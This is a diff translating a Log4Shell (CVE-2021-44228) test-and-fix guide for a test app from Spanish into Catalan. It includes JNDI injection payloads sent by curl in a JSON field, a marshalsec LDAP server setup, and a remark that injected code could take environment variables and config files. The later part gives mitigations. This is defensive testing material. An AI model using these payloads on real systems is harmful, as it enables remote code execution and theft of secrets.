@@ -80,13 +80,13 @@ On el nom de l'aplicació és `CanigoLog4jShellTest`
 > <https://docs.canarytokens.org/guide/> \
 > <https://github.com/thinkst/canarytokens> \
 
- 4- Generar un token tipo `log4jshell` desde: <https://canarytokens.org/generate#>, por ejemplo:
+ 4- Generar un token tipo `log4jshell` desde: <https://canarytokens.org/generate#>, per exemple:
 
   ```txt
   ${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}
   ```
 
- 5- Generar una peticion HTTP Request para crear un `equipament` y en el nombre enviar el token malicioso creado con `canarytokens`
+ 5- Generar una petició HTTP Request para crear un `equipament` i en el nom enviar el token maliciós creat amb `canarytokens`
 
   ```sh
   curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
@@ -94,7 +94,7 @@ On el nom de l'aplicació és `CanigoLog4jShellTest`
     --data-raw '{ "nom": "${jndi:ldap://127.0.0.1.xxxxxxxxxxxx.canarytokens.com/a}","municipi": "Barcelona"}'
   ```
 
- 6- Verificar en el buzón del correo configurado en `canarytokens` y comprobar el correo con la traza de la conexión remota al servidor de la aplicación
+ 6- Verificar que s'ha rebut un correu al correu configurat a `canarytokens` i comprovar que en el contingut del correu hi ha la traça de la connexió remota al servidor de l'aplicació
 
   ![Email exploit test](/images/howtos/log4jshell/email_exploit_alert.png)
 
@@ -102,16 +102,16 @@ On el nom de l'aplicació és `CanigoLog4jShellTest`
 
   ![Canary tokens exploit details 2](/images/howtos/log4jshell/canary_token_exploit_details2.png)
 
-### Utilizando un servidor LDAP
+### Utilizant un servidor LDAP local
 
 ---
 
-> Se requiere: SO Linux, Python3, git, maven, acceso a internet
+> Requereix: SO Linux, Python3, git, maven i accés a internet
 
- 4- Iniciar un servidor web que contenga el código malicioso a inyectar
+ 4- Iniciar un servidor web que contingui el codi malición a injectar
 
-  > Se puede utilizar el proyecto `https://github.com/cybereason/Logout4Shell.git` y modificar la clase `Log4jRCE.java` para agregar cualquier código malicioso que se quiera inyectar en un servidor. \
-  > Por ejemplo se puede agregar este código para inyectar en el servidor una traza
+  > Es pot utilitzar el projecte `https://github.com/cybereason/Logout4Shell.git` i modificar la classe `Log4jRCE.java` per afegir qualsevol codi maliciós que es vulgui injectar al sevidor. \
+  > Per exemple es pot injectar una traça:
 
   ```java
     String dateNow = ZonedDateTime.now(ZoneId.of("Europe/Madrid")).format(DateTimeFormatter.ofPattern("yyyy-MM-dd'T'HH:mm:ss.SSSZ"));
@@ -127,7 +127,7 @@ On el nom de l'aplicació és `CanigoLog4jShellTest`
 
  5- Iniciar un servidor LDAP
 
-  > Se puede utilizar el proyecto `https://github.com/mbechler/marshalsec.git`
+  > es pot utilitzar el projecte `https://github.com/mbechler/marshalsec.git`
 
   ```sh
   git clone https://github.com/mbechler/marshalsec.git
@@ -135,7 +135,7 @@ On el nom de l'aplicació és `CanigoLog4jShellTest`
   java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
   ```
 
- 6- Generar una peticion HTTP Request para crear un `equipament` y en el nombre enviar `${jndi:ldap://127.0.0.1:1389/a}`
+ 6- Generar una petició HTTP Request per crear un `equipament` i en el nom enviar `${jndi:ldap://127.0.0.1:1389/a}`
 
   ```sh
   curl --request POST 'http://127.0.0.1:8080/api/equipaments' \
@@ -143,25 +143,25 @@ On el nom de l'aplicació és `CanigoLog4jShellTest`
     --data-raw '{ "nom": "${jndi:ldap://127.0.0.1:1389/a}","municipi": "Barcelona"}'
   ```
 
- 7- Revisar en el log de la aplicación `CanigoLog4jShellTest` los efectos de explotar la vulnerabilidad
+ 7- Revisar en el log de l'aplicació `CanigoLog4jShellTest` els efectes d'explotar la vulnerabilitat
 
-  > Con la vulnerabilidad
+  > Amb la vulnerabilitat
 
   ![LDAP exploit](/images/howtos/log4jshell/log4jshell_trace1.gif)
 
-  > Sin la vulnerabilidad
+  > Sense la vulnerabilitat
 
   ![LDAP no exploit](/images/howtos/log4jshell/log4jshell_trace2.gif)
 
-  > Se puede apreciar en el log de `CanigoLog4jShellTest` la traza generada por el código inyectado. Se podria obtener por ejemplo, todas las variables de entorno, o los archivos de configuración y enviarlos por correo
+  > Es pot apreciar en el log de `CanigoLog4jShellTest` la traça generada pel codi injectat. D'aquesta manera per exemple, es podria obtenir les variables d'entorn, arxius de configuració, etc i enviarlos per correu
 
-## Como solventar/mitigar la vulnerabilidad
+## Per solucionar la vulnerabilitat
 
 ---
 
- 1- Sustituir la version de la dependencia de la librería `log4j` (tiempo de compilación). Por ejemplo:
+ 1- Sustituir la versió de la dependencia de la librería `log4j` (en temps de compilació). Per exemple:
 
-  1-1 modificando el: `pom.xml` (Opción recomendada) (requiere recompilar y redesplegar)
+  1-1 modificant el: `pom.xml` (Opció recomenada) (es necessari recompilar i redesplegar)
 
   ```xml
   <properties>
@@ -169,23 +169,23 @@ On el nom de l'aplicació és `CanigoLog4jShellTest`
   </properties>
   ```
 
-  1-2 inyectando la variable durante la construcción de la aplicación (requiere recompilar y redesplegar)
+  1-2 injectant la variable durante la construcció de l'aplicación (es necessari recompilar i redesplegar)
 
   ```sh
   mvn -Dlog4j2.version=2.15.0 clean package && java -jar ./target/CanigoLog4jShellTest.war
   ```
 
- 2- Configurar la variable: `log4j2.formatMsgNoLookups (tiempo de ejecución)
+ 2- Configurar la variable: `log4j2.formatMsgNoLookups (en temps d'execució)
 
-  2-1 inyectando la variable (sirve para: 2.10 >= log4j >= 2.14.1) (requiere redesplegar)
+  2-1 injectant la variable (serveix per: 2.10 >= log4j >= 2.14.1) (es necessari redesplegar)
 
   ```sh
   mvn clean package && java -Dlog4j2.formatMsgNoLookups=true -jar ./target/CanigoLog4jShellTest.war
   ```
 
-  2-2 agregando una variable de entorno (sirve para: 2.10 >= log4j >= 2.14.1) (requiere redesplegar)
+  2-2 agregant una variable d'entorn (serveix per: 2.10 >= log4j >= 2.14.1) (es necessari redesplegar)
 
-  > fuente: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/
+  > font: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/
 
   ```sh
   mvn clean package docker:build \
@@ -197,19 +197,19 @@ On el nom de l'aplicació és `CanigoLog4jShellTest`
     canigo/app
   ```
 
- 3- Modificar el patron de trazas configuradas en el archivo: `log4j.xml` (sirve para: 2.0-beta1 >= log4j >= 2.14.1) (requiere recompilar y redesplegar), por ejemplo:
+ 3- Modificar el patró de traces configuradas en el fitxer: `log4j.xml` (serveix per: 2.0-beta1 >= log4j >= 2.14.1) (es necessari recompilar i redesplegar), per exemple:
 
-  > fuente: https://kb.vmware.com/s/article/87093
+  > font: https://kb.vmware.com/s/article/87093
 
   ```sh
-  ## cambiar:
+  ## canviar:
   <PatternLayout pattern="canigo Message: %d{dd MM yyyy HH:mm:ss,SSS} %-5p [%t] %-5p [%t] %c - %m%n" />
 
-  ## por:
+  ## per:
   <PatternLayout pattern="canigo Message: %d{dd MM yyyy HH:mm:ss,SSS} %-5p [%t] %-5p [%t] %c - %m{nolookups}%n" />
   ```
 
- 4- Eliminar la clase `maliciosa` (sirve para: 2.0-beta1 >= log4j >= 2.14.1) (requiere recompilar y redesplegar), por ejemplo:
+ 4- Eliminar la classe `maliciosa` (serveix per: 2.0-beta1 >= log4j >= 2.14.1) (es necessari recompilar i redesplegar), per exemple:
 
   ```sh
   zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
